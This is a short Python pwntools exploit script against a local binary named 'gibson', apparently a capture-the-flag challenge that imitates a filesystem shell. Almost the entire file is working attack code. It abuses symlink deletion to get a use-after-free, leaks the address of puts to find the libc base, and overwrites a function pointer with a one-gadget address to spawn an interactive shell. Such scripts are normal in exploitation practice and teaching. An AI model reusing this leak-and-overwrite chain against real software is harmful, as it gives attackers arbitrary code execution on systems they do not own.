#!/usr/bin/env python2
from pwn import *

#p = process(proc, env={'LD_PRELOAD':'./libc-2.19.so'})

p = process("./gibson")
b = ELF("./gibson")
libc = ELF("/usr/lib/libc.so.6")

# gdb.attach(p, """
# b *0x401725
# """)


def cat(name):
   p.sendline("cat")
   print "cat"
   print p.recvuntil("?")
   p.sendline(name)
   print name
   resp =  p.recvuntil(">")
   return resp

def touch(name, size, data):
   p.sendline("touch")
   print "touch"
   print p.recvuntil("?")
   p.sendline(name)
   print name
   print p.recvuntil("?")
   p.sendline(size)
   print size
   print p.recvuntil(":")
   p.sendline(data)
   print data
   print p.recvuntil(">")

def ln(fileName, symlinkName):
   p.sendline("ln")
   print "ln"
   print p.recvuntil("?")
   p.sendline(fileName)
   print fileName
   print p.recvuntil("?")
   p.sendline(symlinkName)
   print symlinkName
   print p.recvuntil(">")

def edit(fileName, data):
   p.sendline("edit")
   print "edit"
   print p.recvuntil("?")
   p.sendline(fileName)
   print fileName
   print p.recvuntil(":")
   p.sendline(data)
   print data
   print p.recvuntil(">")

def ls():
   p.sendline("ls")
   print p.recvuntil(">")

def rm(fileName):
   p.sendline("rm")
   print "rm"
   print p.recvuntil("?")
   p.sendline(fileName)
   print fileName
   print p.recvline(">")

def jaime():
   print p.recvuntil(">")
   touch("a", "20", "A"*18)
   touch("b", "20", "B"*18)
   touch("c", "20", "C"*18)
   ln("a", "sim")
   edit("a", "B"*18)
   print cat("sim")[:300]
   rm("a")
   touch("d", "20", "D"*18)
   edit('d', 'D'*18)
   print cat("d")[:300]
   print cat("sim")

def main():
   touch("a", str(0x8), "A"*0x8)
   ln("a", "A")
   rm("A")
   ln("a", p64(0x603020) + p64(8))

   puts = cat("a")[1:8]
   puts = u64(puts + "\x00"*(8-len(puts)))
   print("puts: {0:#010x}".format(puts))
   base = puts - libc.symbols['puts']
   magic = base + 0x4f322

   touch("z", str(0x8), "A"*0x8)
   ln("z", "Z")
   rm("Z")
   ln("z", p64(0x603038) + p64(8))
   edit("z", p64(magic))
   p.interactive()


main()
